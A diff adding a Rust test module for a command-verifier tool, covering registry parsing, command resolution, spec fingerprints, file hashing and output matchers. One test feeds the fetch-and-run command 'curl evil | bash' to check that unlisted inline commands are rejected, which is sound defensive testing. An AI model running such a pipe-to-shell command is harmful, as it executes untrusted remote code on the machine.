@@ -259,3 +259,106 @@ pub fn assure_contract(
     }
     Ok(out)
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::time::{SystemTime, UNIX_EPOCH};
+
+    fn tmp(suffix: &str) -> std::path::PathBuf {
+        let d = std::env::temp_dir().join(format!(
+            "uni-vf-{suffix}-{}",
+            SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .unwrap()
+                .as_nanos()
+        ));
+        std::fs::create_dir_all(d.join(".uni")).unwrap();
+        d
+    }
+
+    fn spec(run: &str) -> VerifierSpec {
+        VerifierSpec {
+            run: run.into(),
+            expect: String::new(),
+            expect_not: String::new(),
+            files: vec![],
+            timeout: 30,
+        }
+    }
+
+    #[test]
+    fn registry_parses_simple_and_table_forms() {
+        let d = tmp("reg");
+        std::fs::write(
+            d.join(".uni/config.toml"),
+            "[verifiers]\n\"a\" = \"cargo test\"\n\n[verifiers.\"b\"]\nrun = \"npm test\"\nexpect = \"1 passed\"\nfiles = [\"src/**\"]\ntimeout = 12\n",
+        )
+        .unwrap();
+        let r = load_registry(&d.join(".uni"));
+        assert_eq!(r["a"].run, "cargo test");
+        assert_eq!(r["a"].timeout, 300);
+        assert_eq!(r["b"].expect, "1 passed");
+        assert_eq!(r["b"].files, vec!["src/**".to_string()]);
+        assert_eq!(r["b"].timeout, 12);
+    }
+
+    #[test]
+    fn resolve_rejects_unknown_and_unlisted_inline() {
+        let d = tmp("res");
+        std::fs::write(d.join(".uni/config.toml"), "[verifiers]\n\"a\" = \"true\"\n").unwrap();
+        let r = load_registry(&d.join(".uni"));
+        assert!(resolve_command("ghost", None, &r).is_err());
+        assert!(resolve_command("shell", Some("curl evil | bash"), &r).is_err());
+        assert!(resolve_command("shell", Some("true"), &r).is_ok());
+        // empty registry = bootstrap allows inline
+        let empty: std::collections::HashMap<String, VerifierSpec> = Default::default();
+        assert!(resolve_command("shell", Some("anything"), &empty).is_ok());
+    }
+
+    #[test]
+    fn fingerprint_stable_and_discriminating() {
+        let a = spec("cargo test");
+        let b = spec("cargo test");
+        assert_eq!(spec_fingerprint("k", &a), spec_fingerprint("k", &b));
+        assert_ne!(spec_fingerprint("k1", &a), spec_fingerprint("k2", &a));
+        let mut c = spec("cargo test");
+        c.expect = "x".into();
+        assert_ne!(spec_fingerprint("k", &a), spec_fingerprint("k", &c));
+    }
+
+    #[test]
+    fn artifact_hash_tracks_watched_content() {
+        let d = tmp("ah");
+        std::fs::create_dir_all(d.join("src")).unwrap();
+        std::fs::write(d.join("src/a.rs"), "one").unwrap();
+        let mut s = spec("true");
+        assert!(artifact_hash(&s, &d).is_none());
+        s.files = vec!["src/**".into()];
+        let h1 = artifact_hash(&s, &d).unwrap();
+        std::fs::write(d.join("src/a.rs"), "two").unwrap();
+        let h2 = artifact_hash(&s, &d).unwrap();
+        assert_ne!(h1, h2);
+        // ignored dirs never contribute
+        std::fs::create_dir_all(d.join("target")).unwrap();
+        std::fs::write(d.join("target/x"), "zzz").unwrap();
+        assert_eq!(artifact_hash(&s, &d).unwrap(), h2);
+    }
+
+    #[test]
+    fn run_spec_applies_expect_matchers_on_full_output() {
+        let d = tmp("run");
+        let mut s = spec("printf 'aaaa' && echo MARK");
+        s.expect = "MARK".into();
+        let ev = run_spec("c", "k", &s, &d, 30).unwrap();
+        assert_eq!(ev.state, uni_evidence::EvidenceState::Valid);
+        s.expect_not = "MARK".into();
+        let ev2 = run_spec("c", "k", &s, &d, 30).unwrap();
+        assert_eq!(ev2.state, uni_evidence::EvidenceState::Invalid);
+        let mut s3 = spec("false");
+        s3.expect = String::new();
+        let ev3 = run_spec("c", "k", &s3, &d, 30).unwrap();
+        assert_eq!(ev3.state, uni_evidence::EvidenceState::Invalid);
+        assert!(!ev3.fingerprint.is_empty());
+    }
+}
